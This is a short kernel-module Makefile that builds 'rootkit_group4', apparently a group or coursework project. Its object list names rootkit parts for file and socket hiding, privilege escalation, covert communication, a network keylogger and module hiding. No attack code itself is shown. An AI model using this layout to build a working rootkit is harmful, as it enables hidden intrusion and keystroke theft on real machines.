obj-m += rootkit_group4.o
rootkit_group4-y := main.o include.o getdents.o hide_socket.o read.o control.o privilege_escalation.o covert_communication.o net_keylog.o hide_module.o
ccflags-y = -std=gnu99 -Wno-declaration-after-statement -DDEBUG

all:	sysmap
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	
sysmap:
	./gensysmap.sh
	@echo "Generated sysmap.h"

clean:
	@rm -f sysmap.h
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

